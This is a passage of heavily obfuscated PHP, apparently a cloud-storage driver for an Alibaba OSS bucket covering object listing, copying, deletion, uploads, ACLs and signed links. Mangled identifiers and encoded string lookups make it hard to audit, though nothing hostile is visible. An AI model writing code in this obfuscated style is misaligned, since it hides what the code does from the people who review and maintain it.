array($¥ô‚”È–[1370] => $ÂÖâª¶‡, $¥ô‚”È–[1371] => $ÁßÛÚó, $¥ô‚”È–[1372] => $Ç£»¤¸ñ, $¥ô‚”È–[1373] => $à±µô); try { $‰±“ÜÒ§ = $this->client->listObjects($this->bucket, $Ì÷ÌãÃõ); } catch (OSS\Core\OssException $×ëäÁ›Ñ) { break; } $à±µô = $‰±“ÜÒ§->getNextMarker(); $‡‘ÛËæü = $‰±“ÜÒ§->getObjectList(); $˜éÆ¦Á© = $‰±“ÜÒ§->getPrefixList(); foreach ($‡‘ÛËæü as $Ä€Õó­) { if ($Ä€Õó­->getKey() == $ÁßÛÚó) { continue; } $ƒû›œİ = $Ä€Õó­->getKey(); $¨Šîà«Š = $Ä€Õó­->getSize(); $ŒµŞÌÍÙ = $Ä€Õó­->getLastModified(); $±¶ÙŸ = $àøö«ñ ? array($¥ô‚”È–[32] => $ƒû›œİ, $¥ô‚”È–[80] => $¨Šîà«Š, $¥ô‚”È–[196] => strtotime($ŒµŞÌÍÙ)) : $ƒû›œİ; $ºŸ¾¦—ª = $¨Šîà«Š == 0 && substr($ƒû›œİ, strlen($ƒû›œİ) - 1, 1) == $¥ô‚”È–[8] ? !0 : !1; if ($†ùÏŞ°ã) { $this->cacheMethod($¥ô‚”È–[198], $ƒû›œİ, $ºŸ¾¦—ª); $this->cacheMethod($¥ô‚”È–[199], $ƒû›œİ, array($¥ô‚”È–[80] => $¨Šîà«Š, $¥ô‚”È–[1374] => $¨Šîà«Š, $¥ô‚”È–[86] => strtotime($ŒµŞÌÍÙ), $¥ô‚”È–[1375] => $ŒµŞÌÍÙ)); } if ($ºŸ¾¦—ª) { $èìé“Å[] = $ƒû›œİ; continue; } $º»È¿®Ñ[] = $±¶ÙŸ; } foreach ($˜éÆ¦Á© as $ºíì²øÖ) { $èìé“Å[] = $ºíì²øÖ->getPrefix(); if ($†ùÏŞ°ã) { $this->cacheMethod($¥ô‚”È–[198], $ƒû›œİ, !0); } } if ($à±µô === $¥ô‚”È–[12]) { break; } } if ($†ùÏŞ°ã) { $this->cacheMethod($¥ô‚”È–[198], $­¢ƒ¸€è, !0); } return array($¥ô‚”È–[77] => $èìé“Å, $¥ô‚”È–[76] => $º»È¿®Ñ); } public function copyFile($£šŠ«˜€, $­¼€¦˜³) { $‚ã†¯ „ = $this->size($£šŠ«˜€); if ($‚ã†¯ „ < 1024 * 1024 * 1024) { try { $this->client->copyObject($this->bucket, $£šŠ«˜€, $this->bucket, $this->pathEncode($­¼€¦˜³)); } catch (OSS\Core\OssException $„ñ² Í¶) { return !1; } return $this->getPathOuter($­¼€¦˜³); } $ìÚ¼ËÑŒ = $this->multiCopyObject($£šŠ«˜€, $­¼€¦˜³, $‚ã†¯ „); return $ìÚ¼ËÑŒ ? $this->getPathOuter($­¼€¦˜³) : !1; } private function multiCopyObject($äöôæê´, $¸Îåïéı, $ƒ‘šÃ¤”) { $¬Ûèğ‚ı =& $_SERVER[ì…™Î¶Ï]; try { $¾³œ±è× = array(); if ($ù‚šˆñ = $this->hashMd5($äöôæê´)) { $¾³œ±è× = array(OSS\OssClient::OSS_HEADERS => array($¬Ûèğ‚ı[1376] => $ù‚šˆñ)); } $ª— ¥­Å = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($¸Îåïéı), $¾³œ±è×); $µ¾ğ …å = 1; $ñßê÷…² = 0; $ë›àé = array(); $İĞª’íÉ = 1024 * 1024 * 10; $¬İèİ÷Ú = $this->client->generateMultiuploadParts($ƒ‘šÃ¤”, $İĞª’íÉ); foreach ($¬İèİ÷Ú as $­ş‘¨µ£ => $šøÓğ©Ğ) { $Å·¥ÆôŠ = $ñßê÷…² + (int) $šøÓğ©Ğ[$¬Ûèğ‚ı[1377]]; $æ„œºØ™ = (int) $šøÓğ©Ğ[$¬Ûèğ‚ı[332]] + $Å·¥ÆôŠ - 1; $¡Î±Üœ = array($¬Ûèğ‚ı[1378] => $Å·¥ÆôŠ, $¬Ûèğ‚ı[1379] => $æ„œºØ™); $ë›àé[] = $this->client->uploadPartCopy($this->bucket, $äöôæê´, $this->bucket, $this->pathEncode($¸Îåïéı), $µ¾ğ …å, $ª— ¥­Å, $¡Î±Üœ); $µ¾ğ …å = $µ¾ğ …å + 1; } $êÃ–Ó¿» = array(); foreach ($ë›àé as $­ş‘¨µ£ => $îÁôÜíÃ) { $êÃ–Ó¿»[] = array($¬Ûèğ‚ı[1380] => $­ş‘¨µ£ + 1, $¬Ûèğ‚ı[1381] => $îÁôÜíÃ); } $this->client->completeMultipartUpload($this->bucket, $this->pathEncode($¸Îåïéı), $ª— ¥­Å, $êÃ–Ó¿»); } catch (OSS\Core\OssException $Ñü¬·Œ) { return !1; } return !0; } public function moveFile($Œˆ¡œ¢Ù, $Ù‚÷ğ–³) { if ($this->copyFile($Œˆ¡œ¢Ù, $Ù‚÷ğ–³)) { $this->remove($Œˆ¡œ¢Ù); return $this->getPathOuter($Ù‚÷ğ–³); } return !1; } public function delFile($Î‹Ä•»‹) { try { $this->client->deleteObject($this->bucket, $this->pathEncode($Î‹Ä•»‹)); } catch (OSS\Core\OssException $ö·ßò‘ò) { return !1; } return !0; } public function delFolder($ñüÇ¤) { $Ä€ôçü¬ =& $_SERVER[ì…™Î¶Ï]; if (!$this->exist($ñüÇ¤)) { return !0; } $this->listItemCache = !1; $²Ï«ÒÓÔ = $this->fileList($ñüÇ¤); $this->listItemCache = !0; $—óÍìËü = trim($ñüÇ¤, $Ä€ôçü¬[8]) . $Ä€ôçü¬[8]; if (!empty($ñüÇ¤) && $ñüÇ¤ !== $Ä€ôçü¬[190] && !in_array($—óÍìËü, $²Ï«ÒÓÔ[$Ä€ôçü¬[77]])) { $²Ï«ÒÓÔ[$Ä€ôçü¬[77]][] = $—óÍìËü; } $àµú½› = $this->delByBatch($²Ï«ÒÓÔ[$Ä€ôçü¬[76]]); if (!$àµú½›) { return !1; } $àµú½› = $this->delByBatch($²Ï«ÒÓÔ[$Ä€ôçü¬[77]]); if (!$àµú½›) { return !1; } return $this->delFile($—óÍìËü); } private function delByBatch($îìœõ­) { foreach (array_chunk($îìœõ­, 1000) as $¥ÒŞËº) { try { $this->client->deleteObjects($this->bucket, $¥ÒŞËº); } catch (OSS\Core\OssException $ŸÜÌÂË£) { return !1; } } return !0; } public function rename($ò‚¸Çü¿, $ÂäËş) { return $this->renameObject($ò‚¸Çü¿, $ÂäËş); } private function fileInfo($ë²ƒæÔ, $¹¸‚¹» = false, $–ƒù÷Úİ = array()) { $œË¤ Òè =& $_SERVER[ì…™Î¶Ï]; $“ŠĞûÆ„ = array($œË¤ Òè[32] => $this->pathThis($ë²ƒæÔ), $œË¤ Òè[78] => $this->getPathOuter($ë²ƒæÔ), $œË¤ Òè[33] => $œË¤ Òè[192], $œË¤ Òè[80] => isset($–ƒù÷Úİ[$œË¤ Òè[80]]) ? $–ƒù÷Úİ[$œË¤ Òè[80]] : 0, $œË¤ Òè[167] => $this->ext($ë²ƒæÔ)); if ($¹¸‚¹») { return $“ŠĞûÆ„; } $“ŠĞûÆ„[$œË¤ Òè[193]] = $“ŠĞûÆ„[$œË¤ Òè[86]] = 0; $“ŠĞûÆ„[$œË¤ Òè[194]] = $“ŠĞûÆ„[$œË¤ Òè[195]] = !0; if (empty($–ƒù÷Úİ)) { $‘‡ÁßÒñ = $this->objectMeta($ë²ƒæÔ); if (!$‘‡ÁßÒñ) { return $“ŠĞûÆ„; } $–ƒù÷Úİ = array($œË¤ Òè[86] => strtotime($‘‡ÁßÒñ[$œË¤ Òè[1375]]), $œË¤ Òè[80] => $‘‡ÁßÒñ[$œË¤ Òè[1374]] + 0); } if (isset($–ƒù÷Úİ[$œË¤ Òè[80]])) { $“ŠĞûÆ„[$œË¤ Òè[80]] = $–ƒù÷Úİ[$œË¤ Òè[80]]; } if (isset($–ƒù÷Úİ[$œË¤ Òè[86]])) { $“ŠĞûÆ„[$œË¤ Òè[86]] = $–ƒù÷Úİ[$œË¤ Òè[86]]; } if (isset($–ƒù÷Úİ[$œË¤ Òè[196]]) && !trim($“ŠĞûÆ„[$œË¤ Òè[86]])) { $“ŠĞûÆ„[$œË¤ Òè[86]] = $–ƒù÷Úİ[$œË¤ Òè[196]]; } return $“ŠĞûÆ„; } private function folderInfo($ıø²†™š, $ò¿‹–†® = false, $â©øÆ‘¢ = array()) { $ê¦úÆü¾ =& $_SERVER[ì…™Î¶Ï]; $„÷••üà = array($ê¦úÆü¾[32] => $this->pathThis($ıø²†™š), $ê¦úÆü¾[78] => $this->getPathOuter($ê¦úÆü¾[8] . $ıø²†™š), $ê¦úÆü¾[33] => $ê¦úÆü¾[79]); if ($ò¿‹–†®) { return $„÷••üà; } $„÷••üà[$ê¦úÆü¾[193]] = $„÷••üà[$ê¦úÆü¾[86]] = 0; $„÷••üà[$ê¦úÆü¾[194]] = $„÷••üà[$ê¦úÆü¾[195]] = !0; if (empty($â©øÆ‘¢)) { $ıø²†™š = rtrim($ıø²†™š, $ê¦úÆü¾[8]) . $ê¦úÆü¾[8]; $¡ÚÂÖ†¬ = $this->objectMeta($ıø²†™š); if (!$¡ÚÂÖ†¬) { return $„÷••üà; } $â©øÆ‘¢ = array($ê¦úÆü¾[193] => $¡ÚÂÖ†¬[$ê¦úÆü¾[502]][$ê¦úÆü¾[1382]], $ê¦úÆü¾[86] => strtotime($¡ÚÂÖ†¬[$ê¦úÆü¾[1375]])); } if (isset($â©øÆ‘¢[$ê¦úÆü¾[86]])) { $„÷••üà[$ê¦úÆü¾[86]] = $â©øÆ‘¢[$ê¦úÆü¾[86]]; } if (isset($â©øÆ‘¢[$ê¦úÆü¾[193]])) { $„÷••üà[$ê¦úÆü¾[193]] = $â©øÆ‘¢[$ê¦úÆü¾[193]]; } return $„÷••üà; } public function listPath($Îè˜ÕÌš, $‚Á÷¿ğ™ = false) { $¦ÊŠÓ”È =& $_SERVER[ì…™Î¶Ï]; $†áâŞ„Ò = $this->fileList($Îè˜ÕÌš, $¦ÊŠÓ”È[8], !0); foreach ($†áâŞ„Ò[$¦ÊŠÓ”È[77]] as $øáÚæä© => $±Ò§Àåú) { $†áâŞ„Ò[$¦ÊŠÓ”È[77]][$øáÚæä©] = $this->folderInfo($±Ò§Àåú, $‚Á÷¿ğ™, $±Ò§Àåú); } foreach ($†áâŞ„Ò[$¦ÊŠÓ”È[76]] as $øáÚæä© => $±Ò§Àåú) { $†áâŞ„Ò[$¦ÊŠÓ”È[76]][$øáÚæä©] = $this->fileInfo($±Ò§Àåú[$¦ÊŠÓ”È[32]], $‚Á÷¿ğ™, $±Ò§Àåú); } return $†áâŞ„Ò; } public function has($×¢Õ§àÌ, $ì¿«á˜ = false, $×©‰–‘ = true) { $®«î›ì =& $_SERVER[ì…™Î¶Ï]; $×¢Õ§àÌ = trim($×¢Õ§àÌ, $®«î›ì[8]); $‰£Ë¼Ï‡ = empty($×¢Õ§àÌ) && $×¢Õ§àÌ !== $®«î›ì[190] ? $®«î›ì[12] : $×¢Õ§àÌ . $®«î›ì[8]; $å†Î±‚¦ = $®«î›ì[12]; $§–û¦õ‡ = 500; $ãŸªÍèü = $êÆÁÅÅŸ = 0; while (!0) { check_abort(); $í»²ãéÉ = array($®«î›ì[1370] => $®«î›ì[8], $®«î›ì[1371] => $‰£Ë¼Ï‡, $®«î›ì[1372] => $§–û¦õ‡, $®«î›ì[1373] => $å†Î±‚¦); try { $ÍÔë÷õá = $this->client->listObjects($this->bucket, $í»²ãéÉ); } catch (OSS\Core\OssException $¶‡ËıÚŞ) { break; } $å†Î±‚¦ = $ÍÔë÷õá->getNextMarker(); $ÈäÚ€á = $ÍÔë÷õá->getObjectList(); $›Ç×íå‘ = $ÍÔë÷õá->getPrefixList(); if ($ì¿«á˜) { if (count($ÈäÚ€á) > 1 || count($ÈäÚ€á) == 1 && $ÈäÚ€á[0]->getKey() != $‰£Ë¼Ï‡) { $ãŸªÍèü += count($ÈäÚ€á) - 1; } if (!empty($›Ç×íå‘)) { $êÆÁÅÅŸ += count($›Ç×íå‘); } if ($å†Î±‚¦ === $®«î›ì[12]) { break; } continue; } if ($×©‰–‘) { if (!empty($ÈäÚ€á)) { if (count($ÈäÚ€á) > 1 || $ÈäÚ€á[0]->getKey() != $‰£Ë¼Ï‡) { return !0; } } } else { if (!empty($›Ç×íå‘)) { return !0; } } if ($å†Î±‚¦ === $®«î›ì[12]) { break; } } if ($ì¿«á˜) { return array($®«î›ì[202] => $ãŸªÍèü, $®«î›ì[203] => $êÆÁÅÅŸ); } return !1; } public function listAll($‡§¬Ğ”Í) { $«õñ£á” =& $_SERVER[ì…™Î¶Ï]; $şõø” = $this->fileList($‡§¬Ğ”Í, $«õñ£á”[12], !0); $Ì®¤õı = array(); foreach ($şõø”[$«õñ£á”[76]] as $ï„±Ü) { $Ì®¤õı[$ï„±Ü[$«õñ£á”[32]]] = $ï„±Ü[$«õñ£á”[80]]; } foreach ($şõø”[$«õñ£á”[77]] as $ï„±Ü) { if (is_string($ï„±Ü)) { $Ì®¤õı[$ï„±Ü] = 0; } } return $this->listAllFiles($‡§¬Ğ”Í, array_keys($Ì®¤õı), $Ì®¤õı); } public function canRead($‰øöËîß) { $×˜˜Á™ğ =& $_SERVER[ì…™Î¶Ï]; $ëÇ’îŞ = $this->pathAcl($‰øöËîß); return $ëÇ’îŞ == $×˜˜Á™ğ[1383] || $ëÇ’îŞ == $×˜˜Á™ğ[541] ? !0 : !1; } public function canWrite($Í€²Ì†à) { $¯±»Ş†Ú = $this->pathAcl($Í€²Ì†à); return $¯±»Ş†Ú == $_SERVER[ì…™Î¶Ï][541] ? !0 : !1; } public function pathAcl($Õó’ıï) { $ã‡º”ñÍ =& $_SERVER[ì…™Î¶Ï]; if (empty($this->bucketAcl)) { $this->bucketAcl = $this->client->getBucketAcl($this->bucket); } try { $ËñúÉõä = $this->client->getObjectAcl($this->bucket, $this->pathEncode($Õó’ıï)); } catch (OSS\Core\OssException $˜²â½ß) { return !1; } $‹˜ì˜­‹ = $ËñúÉõä == $ã‡º”ñÍ[37] ? $this->bucketAcl : $ËñúÉõä; if ($‹˜ì˜­‹ == $ã‡º”ñÍ[1384]) { return $ã‡º”ñÍ[1383]; } if ($‹˜ì˜­‹ == $ã‡º”ñÍ[1385]) { return $ã‡º”ñÍ[541]; } return $‹˜ì˜­‹; } private function chmodPath($«éªùÆø, $¡ÂçÈã­ = '') { $Ô¤ĞŠ¼¬ =& $_SERVER[ì…™Î¶Ï]; $¾å»Íù = empty($¡ÂçÈã­) ? $Ô¤ĞŠ¼¬[1385] : $¡ÂçÈã­; $ÉÚúŸØ¥ = array($Ô¤ĞŠ¼¬[37], $Ô¤ĞŠ¼¬[191], $Ô¤ĞŠ¼¬[1384], $Ô¤ĞŠ¼¬[1385]); if (!in_array($¾å»Íù, $ÉÚúŸØ¥)) { return !1; } try { $this->client->putObjectAcl($this->bucket, $this->pathEncode($«éªùÆø), $¾å»Íù); } catch (OSS\Core\OssException $ÙäÚˆ”·) { return !1; } return !0; } public function getContent($’´±ïÆ–) { return $this->fileSubstr($’´±ïÆ–, -1); } public function setContent($ÉîáÀø, $§„ÃâÛå = '') { $·êÄÍ•š =& $_SERVER[ì…™Î¶Ï]; try { $ëü«³Ş = $this->trafficLimit($·êÄÍ•š[1386]); $»ÒÊì¯ = $this->client->putObject($this->bucket, $this->pathEncode($ÉîáÀø), $§„ÃâÛå, $ëü«³Ş); } catch (OSS\Core\OssException $ô®ÀéøÊ) { return !1; } $âíç¾Ä² = array($·êÄÍ•š[1376] => trim($»ÒÊì¯[$·êÄÍ•š[1387]], $·êÄÍ•š[117]), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($ÉîáÀø))); $this->updateObjMeta($ÉîáÀø, $âíç¾Ä²); return isset($»ÒÊì¯[$·êÄÍ•š[1388]][$·êÄÍ•š[1334]]) ? !0 : !1; } private function updateObjMeta($’Õ¯Ø£á, $¼Ö÷„æğ) { $’Õ¯Ø£á = $this->pathEncode($’Õ¯Ø£á); try { $ÈÛ¼ÔÂ = array(OSS\OssClient::OSS_HEADERS => $¼Ö÷„æğ); $this->client->copyObject($this->bucket, $’Õ¯Ø£á, $this->bucket, $’Õ¯Ø£á, $ÈÛ¼ÔÂ); } catch (OSS\Core\OssException $ÕÚÑìå) { return !1; } return !0; } public function upload($›Ä°ğæ¶, $»ûâŠ¤, $öÕ–¤á¹ = false, $ÔØœ‡Î³ = REPEAT_REPLACE) { $ØÑ„ŠìÔ =& $_SERVER[ì…™Î¶Ï]; $•÷º›Ô = trim($›Ä°ğæ¶, $ØÑ„ŠìÔ[8]); $¯­•±ĞÜ = array(OSS\OssClient::OSS_CHECK_MD5 => !0, OSS\OssClient::OSS_PART_SIZE => 1024 * 1024 * 10, OSS\OssClient::OSS_HEADERS => array($ØÑ„ŠìÔ[1376] => @md5_file($»ûâŠ¤)), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($›Ä°ğæ¶))); $¯­•±ĞÜ = $this->trafficLimit($ØÑ„ŠìÔ[1386], $¯­•±ĞÜ); try { $this->client->multiuploadFile($this->bucket, $this->pathEncode($•÷º›Ô), $»ûâŠ¤, $¯­•±ĞÜ); } catch (OSS\Core\OssException $“Š¶ç) { return !1; } return $this->getPathOuter($›Ä°ğæ¶); } public function getHost() { $ã¥ñôÖ =& $_SERVER[ì…™Î¶Ï]; $¤îÑ¡ŞÚ = explode($ã¥ñôÖ[176], parent::getHost()); return $¤îÑ¡ŞÚ[0] . $ã¥ñôÖ[176] . $this->bucket . $ã¥ñôÖ[10] . $¤îÑ¡ŞÚ[1]; } public function uploadFormData($ËÖáê¥­, $òÈˆ¤Â— = 3600) { $ë¸ àè´ =& $_SERVER[ì…™Î¶Ï]; if (!($¸½îôûÏ = $this->getHost())) { return !1; } $ñ­•ÈíÔ = $òÈˆ¤Â—; $òµŸÊ© = date($ë¸ àè´[1389], time() + $ñ­•ÈíÔ); $ƒà§»Ğ = new DateTime($òµŸÊ©); $¯ÛÄøÒö = $ƒà§»Ğ->format(DateTime::ISO8601); $Şú¤Ù¡¿ = strpos($¯ÛÄøÒö, $ë¸ àè´[291]); $¯ÛÄøÒö = substr($¯ÛÄøÒö, 0, $Şú¤Ù¡¿) . $ë¸ àè´[1390]; $óºÌÎ¤Ì = 1048576000 * 5; $Ş¨Û„Ù¸ = $this->pathFather($ËÖáê¥­); $ªô¢‚‰¹ = array($ë¸ àè´[1286] => $¯ÛÄøÒö, $ë¸ àè´[1287] => array(array($ë¸ àè´[1391], 0, $óºÌÎ¤Ì), array($ë¸ àè´[1290], $ë¸ àè´[1291], $Ş¨Û„Ù¸))); $¨Ø¡â½ô = base64_encode(json_encode($ªô¢‚‰¹)); $ê“¿±îì = base64_encode(hash_hmac($ë¸ àè´[227], $¨Ø¡â½ô, $this->secret, !0)); $‚·Ÿ‹“ = array($ë¸ àè´[1296] => $¨Ø¡â½ô, $ë¸ àè´[1392] => $this->accessKey, $ë¸ àè´[1292] => $ë¸ àè´[1284], $ë¸ àè´[1393] => $ê“¿±îì, $ë¸ àè´[174] => $¸½îôûÏ); $‚·Ÿ‹“ = $this->trafficLimit($ë¸ àè´[1386], $‚·Ÿ‹“); return $‚·Ÿ‹“; } public function multiUploadFormData($œ§óÏ, $¨—†ĞÖ = 3600) { $è¥à„¤Ó =& $_SERVER[ì…™Î¶Ï]; if (!($óä³Üí = $this->getHost())) { return !1; } $ì ¯ÎÀ = $this->trafficLimit($è¥à„¤Ó[1386]); $µ„ìûÂü = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($œ§óÏ), $ì ¯ÎÀ); return array($è¥à„¤Ó[218] => $µ„ìûÂü, $è¥à„¤Ó[174] => $óä³Üí . $è¥à„¤Ó[8] . $this->pathEncode($œ§óÏ), $è¥à„¤Ó[219] => gmdate($è¥à„¤Ó[1394]), $è¥à„¤Ó[95] => $œ§óÏ); } public function multiUploadAuthData($ÜÀÅ‚µó, $øüšßä„ = array()) { $±ÀÁµßÒ =& $_SERVER[ì…™Î¶Ï]; $ĞŒá³ = isset($øüšßä„[$±ÀÁµßÒ[219]]) ? $øüšßä„[$±ÀÁµßÒ[219]] : gmdate($±ÀÁµßÒ[1394]); $‡ıòââÊ = isset($øüšßä„[$±ÀÁµßÒ[167]]) ? $øüšßä„[$±ÀÁµßÒ[167]] : $±ÀÁµßÒ[12]; $ëûİ“Ë = $ÜÀÅ‚µó; if (isset($øüšßä„[$±ÀÁµßÒ[95]])) { $ëûİ“Ë = $øüšßä„[$±ÀÁµßÒ[95]]; unset($øüšßä„[$±ÀÁµßÒ[95]]); } if (isset($øüšßä„[$±ÀÁµßÒ[220]])) { $øüšßä„[$±ÀÁµßÒ[219]] = $ĞŒá³; return $this->listUploadParts($ëûİ“Ë, $øüšßä„); } $´È«¥û‰ = array($±ÀÁµßÒ[221], $±ÀÁµßÒ[12], $±ÀÁµßÒ[118], $ĞŒá³, "\x78\55\x6f\163\x73\55\x64\x61\164\x65\x3a{$ĞŒá³}", $±ÀÁµßÒ[8] . $this->bucket . $±ÀÁµßÒ[8] . $ëûİ“Ë . $‡ıòââÊ); if (strpos($‡ıòââÊ, $±ÀÁµßÒ[222]) === 0) { $´È«¥û‰[0] = $±ÀÁµßÒ[223]; if ($ïÕöÖï = $this->trafficLimit($±ÀÁµßÒ[1386])) { $ëûİ“Ë = $±ÀÁµßÒ[1395]; array_splice($´È«¥û‰, 5, 0, $ëûİ“Ë . $±ÀÁµßÒ[4] . $ïÕöÖï[$ëûİ“Ë]); } } if (isset($øüšßä„[$±ÀÁµßÒ[224]]) && $øüšßä„[$±ÀÁµßÒ[224]] == $±ÀÁµßÒ[225]) { $´È«¥û‰[0] = $±ÀÁµßÒ[225]; } if (!empty($øüšßä„[$±ÀÁµßÒ[1396]])) { $šçˆ÷ÊÉ = array_merge(array($´È«¥û‰[4]), $øüšßä„[$±ÀÁµßÒ[1396]]); sort($šçˆ÷ÊÉ); $´È«¥û‰[4] = implode($±ÀÁµßÒ[226], $šçˆ÷ÊÉ); } $Ÿ€×üìø = implode($±ÀÁµßÒ[226], $´È«¥û‰); $¤—´Ëî = base64_encode(hash_hmac($±ÀÁµßÒ[227], $Ÿ€×üìø, $this->secret, !0)); $ôÓ¾¥½ = $±ÀÁµßÒ[1360] . $this->accessKey . $±ÀÁµßÒ[4] . $¤—´Ëî; if (strpos($‡ıòââÊ, $±ÀÁµßÒ[222]) === 0) { $ôÓ¾¥½ = array($±ÀÁµßÒ[229] => $ôÓ¾¥½, $±ÀÁµßÒ[219] => $ĞŒá³); if ($ïÕöÖï) { $ôÓ¾¥½ = array_merge($ôÓ¾¥½, $ïÕöÖï); } } return $ôÓ¾¥½; } public function listUploadParts($ÕÆõÔœî, $´‚àîŒ ) { $¯ù£˜ç =& $_SERVER[ì…™Î¶Ï]; $ôæŞó¯í = parse_url_query($´‚àîŒ [$¯ù£˜ç[167]]); $ó‰ ŒÇÖ = $this->client->listParts($this->bucket, $this->pathEncode($ÕÆõÔœî), $ôæŞó¯í[$¯ù£˜ç[218]]); $Šà•î­Î = $ó‰ ŒÇÖ->getListPart(); $Â®ú÷ëø = array(); foreach ($Šà•î­Î as $ÛÖÓˆ†Ğ) { $Â®ú÷ëø[] = array($¯ù£˜ç[1380] => $ÛÖÓˆ†Ğ->getPartNumber(), $¯ù£˜ç[1381] => trim($ÛÖÓˆ†Ğ->getETag(), $¯ù£˜ç[117])); } unset($´‚àîŒ [$¯ù£˜ç[220]], $´‚àîŒ [$¯ù£˜ç[224]]); $³Ó¤¥Í = $this->multiUploadAuthData($ÕÆõÔœî, $´‚àîŒ ); if (empty($³Ó¤¥Í)) { return !1; } return array($¯ù£˜ç[229] => $³Ó¤¥Í, $¯ù£˜ç[219] => $´‚àîŒ [$¯ù£˜ç[219]], $¯ù£˜ç[231] => $Â®ú÷ëø); } public function download($úçëÔ¥ë, $é±Û­Éò) { if ($this->isFolder($úçëÔ¥ë)) { return !1; } try { $›’ìá€ = array(OSS\OssClient::OSS_FILE_DOWNLOAD => $é±Û­Éò); $›’ìá€ = $this->trafficLimit($_SERVER[ì…™Î¶Ï][110], $›’ìá€); $this->client->getObject($this->bucket, $this->pathEncode($úçëÔ¥ë), $›’ìá€); } catch (OSS\Core\OssException $ÂŒĞ®‹») { return !1; } return $é±Û­Éò; } public function fileSubstr($±µí†Áˆ, $ÛŒã›‚® = 0, $íË£Ñ¢ = false) { if ($ÛŒã›‚® === -1) { $µ±È›çÈ = array(); } else { if ($íË£Ñ¢ === !1) { $ïîòªƒú = $this->size($±µí†Áˆ); } else { $ïîòªƒú = $ÛŒã›‚® + $íË£Ñ¢ - 1; } $µ±È›çÈ = array(OSS\OssClient::OSS_RANGE => "{$ÛŒã›‚®}\x2d{$ïîòªƒú}"); } try { return $this->client->getObject($this->bucket, $this->pathEncode($±µí†Áˆ), $µ±È›çÈ); } catch (OSS\Core\OssException $¬¨Æ°Õ„) { think_exception($¬¨Æ°Õ„->getMessage()); return !1; } } private function trafficLimit($˜Î§í°÷, $¼ö¶ßã = array()) { $¸€©öå‹ =& $_SERVER[ì…™Î¶Ï]; if ($˜Î§í°÷ == $¸€©öå‹[1386] && $this->isUploadServer() || $˜Î§í°÷ == $¸€©öå‹[110] && $this->isFileOutServer()) { return $¼ö¶ßã; } $¨Ó¥ÈÌ = floatval($GLOBALS[$¸€©öå‹[6]][$¸€©öå‹[90]][$¸€©öå‹[108]][$˜Î§í°÷]) * 1024 * 1024 * 8; if (!$¨Ó¥ÈÌ) { return $¼ö¶ßã; } $¨Ó¥ÈÌ = $¨Ó¥ÈÌ < 819200 ? 819200 : ($¨Ó¥ÈÌ > 838860800 ? 838860800 : $¨Ó¥ÈÌ); $¼ö¶ßã[OSS\OssClient::OSS_TRAFFIC_LIMIT] = intval($¨Ó¥ÈÌ); return $¼ö¶ßã; } public function link($Ü¡‹ÖÎò, $ÛÏ“á¢“ = array()) { $¯Åğù÷ =& $_SERVER[ì…™Î¶Ï]; if (!$this->exist($Ü¡‹ÖÎò) || $this->isFolder($Ü¡‹ÖÎò)) { return !1; } try { $ÛÏ“á¢“ = $this->trafficLimit($¯Åğù÷[110], $ÛÏ“á¢“); $££Óüòï = $this->client->signUrl($this->bucket, $this->pathEncode($Ü¡‹ÖÎò), 3600 * 12, $¯Åğù÷[225], $ÛÏ“á¢“); return $this->getCdnLink($££Óüòï); } catch (OSS\Core\OssException $“³˜Ë´ë) { return !1; } } public function fileOut($‹Íãş¹Ö, $Í¸¬Ëğá = false, $¡Ñ±Ÿåç = false, $è¬ÂøŒ¯ = '') { $¼òâ®±Œ =& $_SERVER[ì…™Î¶Ï]; if ($this->isFileOutServer()) { return $this->fileOutServer($‹Íãş¹Ö, $Í¸¬Ëğá, $¡Ñ±Ÿåç, $è¬ÂøŒ¯); } if (!$¡Ñ±Ÿåç) { $¡Ñ±Ÿåç = $this->pathThis($‹Íãş¹Ö); } $¡Ñ±Ÿåç = rawurlencode($¡Ñ±Ÿåç); $˜ ÖÂ° = get_file_mime(get_path_ext($¡Ñ±Ÿåç)); if ($˜ ÖÂ° == $¼òâ®±Œ[212]) { return parent::fileOut($‹Íãş¹Ö, $Í¸¬Ëğá, $¡Ñ±Ÿåç, $è¬ÂøŒ¯); } $Í¸¬Ëğá = $Í¸¬Ëğá ? $¼òâ®±Œ[1397] : $¼òâ®±Œ[1398]; $İÓ˜‚ò = array(OSS\OssClient::OSS_SUB_RESOURCE => $¼òâ®±Œ[1399] . rawurlencode("{$Í¸¬Ëğá}\x3b\146\x69\154\x65\156\141\155\x65\75{$¡Ñ±Ÿåç}")); $İÓ˜‚ò[OSS\OssClient::OSS_SUB_RESOURCE] .= $¼òâ®±Œ[1400] . rawurlencode($˜ ÖÂ°); $÷‘¿êğ… = $this->link($‹Íãş¹Ö, $İÓ˜‚ò); $this->fileOutLink($÷‘¿êğ…); } public function fileOutServer($Ğ äÃÚà, $ÛØÀ¶üÈ = false, $›ûË½°­ = false, $Â«ë¿¯ = '') { parent::fileOut($Ğ äÃÚà, $ÛØÀ¶üÈ, $›ûË½°­, $Â«ë¿¯); } public function fileOutImage($ßŠ—¹Îï, $ı÷Í¯£„ = 250) { $¢å“ú¦ = array(OSS\OssClient::OSS_PROCESS => $_SERVER[ì…™Î¶Ï][1401] . $ı÷Í¯£„); $˜„Œ¡— = $this->link($ßŠ—¹Îï, $¢å“ú¦); $this->fileOutLink($˜„Œ¡—); } public function fileOutImageServer($„ÌĞâè¡, $ÊæÍ†Çì = 250) { parent::fileOutImage($„ÌĞâè¡, $ÊæÍ†Çì); } public function fileOutLink($ì¨äãÙÀ) { $«âü·õ =& $_SERVER[ì…™Î¶Ï]; if (!$this->isCdnHost() && substr($ì¨äãÙÀ, 0, 7) == $«âü·õ[1299]) { $ì¨äãÙÀ = $«âü·õ[1300] . substr($ì¨äãÙÀ, 7); } header($«âü·õ[158] . $ì¨äãÙÀ); die; } public function hashMd5($˜ŸØ’¬“, $’ù˜ÃÛ° = '') { $Óæõ­é =& $_SERVER[ì…™Î¶Ï]; $Ä…àÉ”¾ = $this->_objectMeta($˜ŸØ’¬“); if (!$Ä…àÉ”¾) { return $Óæõ­é[12]; } if (!isset($Ä…àÉ”¾[$Óæõ­é[1376]]) && !empty($’ù˜ÃÛ°)) { $†›à§Ì = $this->updateObjMeta($˜ŸØ’¬“, array($Óæõ­é[1376] => $’ù˜ÃÛ°)); $Ä…àÉ”¾[$Óæõ­é[1376]] = $†›à§Ì ? $’ù˜ÃÛ° : $Óæõ­é[12]; } return isset($Ä…àÉ”¾[$Óæõ­é[1376]]) ? 